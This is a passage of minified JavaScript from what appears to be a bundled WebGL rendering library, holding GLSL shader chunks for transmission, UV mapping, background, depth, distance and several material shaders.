		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float dispersion, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec4 transmittedLight;
		vec3 transmittance;
		#ifdef USE_DISPERSION
			float halfSpread = ( ior - 1.0 ) * 0.025 * dispersion;
			vec3 iors = vec3( ior - halfSpread, ior, ior + halfSpread );
			for ( int i = 0; i < 3; i ++ ) {
				vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, iors[ i ], modelMatrix );
				vec3 refractedRayExit = position + transmissionRay;
				vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
				vec2 refractionCoords = ndcPos.xy / ndcPos.w;
				refractionCoords += 1.0;
				refractionCoords /= 2.0;
				vec4 transmissionSample = getTransmissionSample( refractionCoords, roughness, iors[ i ] );
				transmittedLight[ i ] = transmissionSample[ i ];
				transmittedLight.a += transmissionSample.a;
				transmittance[ i ] = diffuseColor[ i ] * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance )[ i ];
			}
			transmittedLight.a /= 3.0;
		#else
			vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
			vec3 refractedRayExit = position + transmissionRay;
			vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
			vec2 refractionCoords = ndcPos.xy / ndcPos.w;
			refractionCoords += 1.0;
			refractionCoords /= 2.0;
			transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
			transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		#endif
		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,A1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,C1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,R1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,k1=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const L1=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,P1=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,N1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,I1=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float flipEnvMap;
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
uniform mat3 backgroundRotation;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, backgroundRotation * vec3( flipEnvMap * vWorldDirection.x, vWorldDirection.yz ) );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, backgroundRotation * vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,D1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,U1=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,O1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,F1=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	#ifdef USE_REVERSED_DEPTH_BUFFER
		float fragCoordZ = vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ];
	#else
		float fragCoordZ = 0.5 * vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ] + 0.5;
	#endif
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#elif DEPTH_PACKING == 3202
		gl_FragColor = vec4( packDepthToRGB( fragCoordZ ), 1.0 );
	#elif DEPTH_PACKING == 3203
		gl_FragColor = vec4( packDepthToRG( fragCoordZ ), 0.0, 1.0 );
	#endif
}`,B1=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,z1=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main () {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = vec4( dist, 0.0, 0.0, 1.0 );
}`,V1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
}`,H1=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,G1=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,W1=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,j1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,X1=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,q1=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Y1=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,$1=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,K1=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Z1=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,J1=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
